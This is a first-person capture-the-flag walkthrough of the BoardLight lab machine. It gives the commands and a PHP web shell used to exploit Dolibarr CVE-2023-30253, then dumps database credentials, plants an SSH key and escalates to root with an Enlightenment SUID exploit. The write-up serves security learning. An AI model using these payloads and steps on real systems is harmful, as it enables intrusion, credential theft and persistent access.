### Initial Reconnaissance and Weak Credentials

I began BoardLight with a thorough port scan utilizing version detection and default Nmap scripts. 

```
sudo nmap 10.10.11.11 -p- -T4 -sV -sC -v 
```

The results expose ports 80 and 22. I added the the domain name to `/etc/hosts` and got started with directory and v-host enumeration. I also broadened my search by adding several extensions to my ffuf command. 

```
ffuf -u http://board.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".php,.txt,.html" 
```

```
ffuf -u http://board.htb -H 'Host: FUZZ.board.htb' -w /usr/share/wordlists/subdomains/n0kovo_subdomains/n0kovo_subdomains_large.txt -fs 15949
```

I found a v-host. Upon visiting the URL I found a login page for Dolibarr v17.0.0, an open source ERP and CRM. To be safe, I started directory enumeration on this as well. I decided To make this command recursive, allowing it to run in the background while I searched for exploits and did manual exploitation. 

```
ffuf -u http://crm.board.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -e ".php,.txt,.html" -fs 312,313,314,315,316,317,318,319 -recursion -recursion-depth 3 | tee boardCRMRec.txt
```

After a ton of enumeration, a lot of XSS attempts, a ton of failed SQL injections, and a more than a little head scratching, I discovered that despite my careful enumeration and research, I had neglected to try the most simplistic means of entry. The login for the Admin account had a weak default password. Nonetheless, I had made progress!
### Exploitation of Dolibarr ERP/CRM (CVE-2023–30253)

 By this point, I had already found a fair number of exploits for authenticated users of this application. Now that I myself was authenticated, I went all out. [CVE-2023–30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253) describes an RCE exploit via uppercase manipulation when creating and deploying a website on Dolibarr v17.0.0 and below. I created a website using the application's web template feature and inserted a reverse shell using an uppercase `<?PHP` tag: 

```
    <html>
    <body>
    <form method="GET" name="<?PHP echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?PHP
        if(isset($_GET['cmd']))
        {
            system($_GET['cmd']);
        }
    ?>
    </pre>
    </body>
    <script>document.getElementById("cmd").focus();</script>
    </html>
```

This bypasses the input filter that normally blocks lower-case `<?php` tags, allowing me to execute system commands on the server. However, a cleanup script hindered the manual approach. Fortunately, I found a [Python exploit](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253) for the same vulnerability, which successfully gained me a reverse shell.

```
python3 exploit.py http://crm.board.htb admin admin 10.10.14.8 4444
```

### Privilege Escalation

Now armed with a reverse shell, I looked for possible privilege escalations. I found a home directory for `larissa` and some interesting information in the config files for Dolibarr, specifically `/var/www/html/dolibarr/htdocs/conf/conf.php`.

```
dolibarrowner|ser................
```

With these credentials, I accessed the internal MySQL database to search for further information.

```
mysql -u dolibarrowner -p -e 'show databases;'
```

```
mysql -u dolibarrowner -p -e 'use dolibarr; show tables;'
```

I dumped the user table in search of password hashes.

```
mysql -u dolibarrowner -p -e 'use dolibarr; select * from llx_user;'   
```

```
dolibarr|$2y$10$VevoimSke5Cd1........................
admin|$2y$10$gIEKOl7VZ............................
```

Unfortunately, `dolibarr` doesn't crack and `admin` was a previously known password. What a dud! Not to worry though, I did find a new password and a new user on the way to this point, so why not check them against one another? 

```
ssh larissa@board.htb 
```

Feeling very pleased with myself, and with a shiny new ssh session, I added my own ssh key to the box.

```
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4lAT7D0p6KMGywbYex6A3S/dZPA5ldthzqW48UgF0x kali@kali" > /home/larissa/.ssh/authorized_keys 
```

I also uploaded linpeas and ran it as a background process while I grabbed my user flag. 

```
scp ./linpeas.sh larissa@board.htb:/home/larissa/linpeas.sh 
```

```
./linpeas.sh > linpeas.txt 2> linpeas.txt &
```

### Privilege Escalation: CVE-2022-37706

After digging around and not finding much of use, I returned to linpeas to see what it had uncovered. Right away I noticed a possibly massive vulnerability in the sudo version 1.8.31, but it turned out to not be vulnerable in this configuration. Soon after, however, I saw these files with strange SUID permissions.

```
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
```

  SUID binaries are risky because they run with elevated privileges. In this case,  [CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706) exposes a local privilege escalation vulnerability due to improper pathname handling by the Enlightenment binaries. I found a [POC for this exploit](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit), read through it, and uploaded it to the box. 

```
gh repo clone MaherAzzouzi/CVE-2022-37706-LPE-exploit
scp ./exploit.sh larissa@board.htb:/home/larissa/exploit.sh
```

I then made the script executable, and sat back while it did its job.

```
chmod +x exploit.sh
./exploit.sh
```

With root access obtained, I collected the root flag and completed the machine! This box challenged my assumptions, forcing me to revisit basic security weaknesses, like weak credentials. Despite modern security measures, misconfigurations in widely-used software like Dolibarr and old vulnerabilities in SUID binaries present significant risks in real-world environments. Overall I found myself wanting a bit more from this machine, but It was fun regardless!
